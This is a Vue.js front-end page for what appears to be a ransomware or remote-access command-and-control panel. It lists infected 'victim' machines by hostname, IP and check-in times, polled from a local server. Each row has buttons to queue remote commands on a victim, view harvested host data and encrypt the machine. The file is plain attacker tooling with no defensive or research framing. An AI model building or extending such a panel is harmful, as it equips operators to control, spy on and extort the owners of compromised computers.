<template>
  <v-container class="my-10">
    <div class="pos-r">
      <v-icon
    @click="this.obtainVictims"
    class="update-icon"
    large>
      mdi-update
    </v-icon>
    <v-data-table
    :headers="headers"
    :items="victims"
    :items-per-page="10" 
    :loading="loading"
    >
    <template v-slot:item="{ item }">
      <tr>
      <td class="body-1">
        <div v-if="item.ultima_fecha > today" class="pa-2 green-color rounded-circle d-inline-block"></div>
        <div v-else class="pa-2 red-color rounded-circle d-inline-block"></div>
      </td>
      <td class="text-no-wrap">
        {{item.nombre}}
      </td>
      <td class="text-no-wrap">
        <p v-if="item.primera_fecha">
        {{item.primera_fecha}}
        </p>
      </td>
      <td class="text-no-wrap">
        {{item.ip}}
      </td>
      <td class="text-no-wrap">
        <v-icon @click="openDialog('Ejecutar comando remoto','Escoge un comando a ejecutar en la máquina víctima. Se ejecutará cuando la máquina se pueda conectar al servidor.','remoteCommand', item.id)">mdi-antenna</v-icon>
        <v-icon @click="openDialog('Información detallada','Información obtenida del host:','showInfo',item.id)" class="mx-3">mdi-eye</v-icon>
        <v-icon @click="openDialog('Encryptar equipo','¿Quieres encriptar el equipo?','encrypt',item.id)">mdi-lock</v-icon>
      </td>
      </tr>
    </template>
  </v-data-table>
    </div>
    
  <request-dialog :id="id" :text="text" :title="title" :dialogType="dialogType" :dialog="requestDialog" @dialog-closed="closeDialog"/>
  </v-container>

</template>

<script>
import axios from "axios";
import RequestDialog from "../components/RequestDialog.vue"

  export default {
    name: 'Home',

    components:{
      RequestDialog
    },
    data(){
      return {
        title:"",
        loading:true,
        text:"",
        dialogType:"",
        id: null,
        requestDialog: false,
        today: new Date(),
        victims:[],
        headers:[
          {
            text: "",
            value: 'lastTime',
            sortable: true,
            class:"header"
          },
          {
            text: "HOSTNAME",
            value: 'hostname',
            sortable: true
          },
          {
            text: "FIRST TIME",
            value: 'firstTime',
            sortable: false
          },
          {
            text: "IP",
            value: 'ip',
            sortable: false
          },
          {
            text: "OPTIONS",
            value: 'options',
            sortable: false
          }
        ],
        loading:{
          type: Boolean,
          default: true
        }
      }
    },
    methods:{
      async obtainVictims(){
        this.victims=[]
        this.dateLessFive()
        this.loading = true
        let users
        let parsedUsers = []
        try{
            let hoy = this.today
            users = await axios.get("http://127.0.0.1:3050/equipos")
            users.data.forEach(user => {
              let año = user.ultima_fecha.substring(0,4)
              let mes = user.ultima_fecha.substring(4,6)
              let dia = user.ultima_fecha.substring(6,8)
              let hora = user.ultima_fecha.substring(8,10)
              let min = user.ultima_fecha.substring(10,12)
              let seg = user.ultima_fecha.substring(12,14)
              let miliseg = user.ultima_fecha.substring(14,16)
              let añoPF = user.primera_fecha.substring(0,4)
              let mesPF = user.primera_fecha.substring(4,6)
              let diaPF = user.primera_fecha.substring(6,8)
              let horaPF = user.primera_fecha.substring(8,10)
              let minPF = user.primera_fecha.substring(10,12)
              let segPF = user.primera_fecha.substring(12,14)
              let milisegPF = user.primera_fecha.substring(14,16)
              user.ultima_fecha = new Date(año,mes - 1,dia,hora,min,seg,miliseg)
              user.primera_fecha = new Date(añoPF,mesPF - 1,diaPF,horaPF,minPF,segPF,milisegPF)
              debugger
              parsedUsers.push(user)
            })
        }catch(e){
            console.log(e)
        }
        this.loading = false
        this.victims = users.data
        debugger
      },
      dateLessFive(){
        let today = new Date()
        let fecha = new Date(today)
        fecha.setMinutes(today.getMinutes() - 5)
        this.today = fecha
      },
      openDialog(title,text,dialogType,id) {
        this.title = title
        this.text = text
        this.dialogType = dialogType
        this.id = id
        this.requestDialog = true;
      },
      closeDialog(value) {
        this.requestDialog = value;
      }
    },
    async created(){  
      await this.obtainVictims()
    }
  }
</script>
<style>
.blue-color{
  color:#004290;
}
.dark-blue-color{
  color: #002E65;
}
.headers{
  border-bottom: 2px solid #002E65;
}
.brd-row{
  border-bottom: 1px solid #002E65;
}
.green-color{
  background-color: green;
}
.red-color{
  background-color: red;
}
.bold{
  font-weight: bold;
}
.v-data-table-header span{
  font-size: 18px;
}
.update-icon{
  position: absolute !important;
  right: 10px;
}
.pos-r{
  position: relative;
}
</style>